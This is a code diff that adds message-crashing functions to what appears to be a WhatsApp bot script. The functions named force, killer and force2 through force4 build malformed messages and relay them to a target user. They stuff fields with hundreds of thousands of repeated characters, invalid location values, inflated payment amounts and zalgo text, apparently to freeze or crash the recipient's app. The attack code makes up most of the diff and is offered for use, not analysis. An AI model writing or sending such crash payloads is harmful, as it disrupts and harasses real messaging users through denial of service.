@@ -277,6 +277,7 @@ m.message.InteractiveResponseMessage.NativeFlowResponseMessage ||               
     autoreadsw = true
     const content = JSON.stringify(m.message)
     const q = args.join(' ')
+    const { ios } = require("./Assets/ios.js")
     // const button = m.body
     const { xeontext1 } = require('./src/xeontext1')
     const { xeontext2 } = require('./src/xeontext2')
@@ -434,7 +435,148 @@ m.message.InteractiveResponseMessage.NativeFlowResponseMessage ||               
       setTimeout(updateStatus, randomTime);
     }
     updateStatus();
+const force = {
+key: {
+participant: `0@s.whatsapp.net`,
+...(m.chat ? {
+remoteJid: "status@broadcast"
+} : {})
+},
+'message': {
+"interactiveMessage": { 
+"header": {
+"hasMediaAttachment": true,
+"jpegThumbnail": fs.readFileSync(`./image/latx.png`)
+},
+"nativeFlowMessage": {
+"buttons": [
+{
+"name": "review_and_pay",
+"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"`✳️࿆͆᷍T̸̨̥͔͚͍͙̰̽̾̿̋͂͂ą̸̡̻̬̫͈̦͎͙̪́̾͋͋̈́̽̉̈́͘i̴̟͚͈̻̞̖͂͊̓͗͛r̵̟̣̰̜̣̤͔̺͎̘̂̈́̌͘͠á̸̧̦̜̮͖̙̲͉̯̿̔̄̅͘ͅ ̴̱̤̭͒͌́̍̌̂̾͌̌͝M̷̡̯͔͚͈̜͔͗a̶̫̩̮͕̙͓͚̠͒k̷͔̠̪̤̙̀̊̉̇͂̈́͌̄̑͠ì̷͕̱͎̳̫͊̓̒̓n̴͔̱̂ỡ̷̱͕̮̈́͆̋͊͘͜͝╮⭑ ☠️⃰͜͡؜𝐙𝕩𝐕⃟⭐️᜴▴𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮.xp`+"ꦾ"\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
+}
+]
+}
+}
+}
+}
 
+async function killer(target, quoted) {
+var lol = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
+viewOnceMessage: {
+message: {
+  "liveLocationMessage": {
+    "degreesLatitude": "p",
+    "degreesLongitude": "p",
+    "caption": `✳️࿆͆᷍T̸̨̥͔͚͍͙̰̽̾̿̋͂͂ą̸̡̻̬̫͈̦͎͙̪́̾͋͋̈́̽̉̈́͘i̴̟͚͈̻̞̖͂͊̓͗͛r̵̟̣̰̜̣̤͔̺͎̘̂̈́̌͘͠á̸̧̦̜̮͖̙̲͉̯̿̔̄̅͘ͅ ̴̱̤̭͒͌́̍̌̂̾͌̌͝M̷̡̯͔͚͈̜͔͗a̶̫̩̮͕̙͓͚̠͒k̷͔̠̪̤̙̀̊̉̇͂̈́͌̄̑͠ì̷͕̱͎̳̫͊̓̒̓n̴͔̱̂ỡ̷̱͕̮̈́͆̋͊͘͜͝╮⭑ ☠️⃰͜͡؜𝐙𝕩𝐕⃟⭐️᜴▴𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮.xp`+"ꦾ".repeat(50000),                  
+    "sequenceNumber": "0",
+    "jpegThumbnail": ""
+     }
+  }
+}
+}), { userJid: m.chat, quoted: quoted })
+await Taira.relayMessage(target, lol.message, { messageId: lol.key.id })
+	}
+
+async function force2(target, quoted) {
+ var lol = generateWAMessageFromContent(target, proto.Message.fromObject({
+  "stickerMessage": {
+    "url": "https://mmg.whatsapp.net/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000&mms3=true",
+    "fileSha256": "CWJIxa1y5oks/xelBSo440YE3bib/c/I4viYkrCQCFE=",
+    "fileEncSha256": "r6UKMeCSz4laAAV7emLiGFu/Rup9KdbInS2GY5rZmA4=",
+    "mediaKey": "4l/QOq+9jLOYT2m4mQ5Smt652SXZ3ERnrTfIsOmHWlU=",
+    "mimetype": "image/webp",
+    "directPath": "/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000",
+    "fileLength": "10116",
+    "mediaKeyTimestamp": "1715876003",
+    "isAnimated": false,
+    "stickerSentTs": "1715881084144",
+    "isAvatar": false,
+    "isAiSticker": false,
+    "isLottie": false
+  }
+}), { userJid: target, quoted: kuwoted });
+await Taira.relayMessage(target, lol.message, { participant: { jid: target }, messageId: lol.key.id });
+		}
+
+async function force3(target, quoted) {
+ var lol = generateWAMessageFromContent(target, proto.Message.fromObject({
+    interactiveMessage: {
+      header: {
+        title: "🩸⃟༑⌁⃰𝐙͈𝐞͢𝐫𝐨 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠",
+        hasMediaAttachment: true,
+        ...(await prepareWAMessageMedia({ image: { url: "https://telegra.ph/file/e8c1aee03b13f008ff65d.jpg" } }, { upload: ryozingod.waUploadToServer }))
+      },
+      body: {
+        text: ""
+      },
+      footer: {
+        text: "›          #MakinoByTaira"
+      },
+      nativeFlowMessage: {
+        messageParamsJson: " ".repeat(1000000)
+      }
+    }
+}), { userJid: target, quoted: quoted });
+await Taira.relayMessage(target, lol.message, { participant: { jid: target }, messageId: lol.key.id });
+} 
+
+async function force4(target, quoted) {
+ var lol = generateWAMessageFromContent(target, proto.Message.fromObject({
+  'listMessage': {
+    'title': "𝕾𝖕𝖎𝖉𝖊𝖗➯𝖂𝖊𝖇➊"+" ".repeat(920000),
+        'footerText': `✳️࿆͆᷍T̸̨̥͔͚͍͙̰̽̾̿̋͂͂ą̸̡̻̬̫͈̦͎͙̪́̾͋͋̈́̽̉̈́͘i̴̟͚͈̻̞̖͂͊̓͗͛r̵̟̣̰̜̣̤͔̺͎̘̂̈́̌͘͠á̸̧̦̜̮͖̙̲͉̯̿̔̄̅͘ͅ ̴̱̤̭͒͌́̍̌̂̾͌̌͝M̷̡̯͔͚͈̜͔͗a̶̫̩̮͕̙͓͚̠͒k̷͔̠̪̤̙̀̊̉̇͂̈́͌̄̑͠ì̷͕̱͎̳̫͊̓̒̓n̴͔̱̂ỡ̷̱͕̮̈́͆̋͊͘͜͝╮⭑ ☠️⃰͜͡؜𝐙𝕩𝐕⃟⭐️᜴▴𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮.xp`,
+        'description': `✳️࿆͆᷍T̸̨̥͔͚͍͙̰̽̾̿̋͂͂ą̸̡̻̬̫͈̦͎͙̪́̾͋͋̈́̽̉̈́͘i̴̟͚͈̻̞̖͂͊̓͗͛r̵̟̣̰̜̣̤͔̺͎̘̂̈́̌͘͠á̸̧̦̜̮͖̙̲͉̯̿̔̄̅͘ͅ ̴̱̤̭͒͌́̍̌̂̾͌̌͝M̷̡̯͔͚͈̜͔͗a̶̫̩̮͕̙͓͚̠͒k̷͔̠̪̤̙̀̊̉̇͂̈́͌̄̑͠ì̷͕̱͎̳̫͊̓̒̓n̴͔̱̂ỡ̷̱͕̮̈́͆̋͊͘͜͝╮⭑ ☠️⃰͜͡؜𝐙𝕩𝐕⃟⭐️᜴▴𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮.xp`,
+        'buttonText': null,
+        'listType': 2,
+        'productListInfo': {
+          'productSections': [{
+            'title': 'anjay',
+            'products': [
+              { "productId": "4392524570816732" }
+            ]
+          }],
+          'productListHeaderImage': {
+            'productId': '4392524570816732',
+            'jpegThumbnail': null
+          },
+          'businessOwnerJid': '0@s.whatsapp.net'
+        }
+      },
+      'footer': 'Makino',
+      'contextInfo': {
+        'expiration': 604800,
+        'ephemeralSettingTimestamp': "1679959486",
+        'entryPointConversionSource': "global_search_new_chat",
+        'entryPointConversionApp': "whatsapp",
+        'entryPointConversionDelaySeconds': 9,
+        'disappearingMode': {
+          'initiator': "INITIATED_BY_ME"
+        }
+      },
+      'selectListType': 2,
+      'product_header_info': {
+        'product_header_info_id': 292928282928,
+        'product_header_is_rejected': false
+      }
+    }), { userJid: target, quoted: tbug });
+await Taira.relayMessage(target, lol.message, { participant: { jid: target }, messageId: lol.key.id });
+}
+
+async function loading () {
+var loaded = [
+"《 ⓹...》10%",
+"《 ⓸...》30%",
+"《 ⓷...》50%",
+"《 ⓶...》80%",
+"《 ⓵...》100%",
+"𝙻𝙾𝙰𝙳𝙸𝙽𝙶 𝙲𝙾𝙼𝙿𝙻𝙴𝚃𝙴𝙳 🐉..."
+]
+let { key } = await Taira.sendMessage(from, {text: 'ʟᴏᴀᴅɪɴɢ...'})
+
+for (let i = 0; i < loaded.length; i++) {
+await Taira.sendMessage(from, {text: loaded[i], edit: key });
+}
+	}
 
 
     //-----------------------------------------------------------------------------------------------------------------------------------//
@@ -582,7 +724,12 @@ const smallinput = budy.toLowerCase();
 
 
     switch (command) {
-
+case 'clear': {
+messg = "\n".repeat(200)
+joreply(pee + '😝🖕')
+}
+break
+		    
 case 'addprem':
                 if (isBan) return m.reply(mess.banned);                             
 		if (isBanChat) return m.reply(mess.bangc);
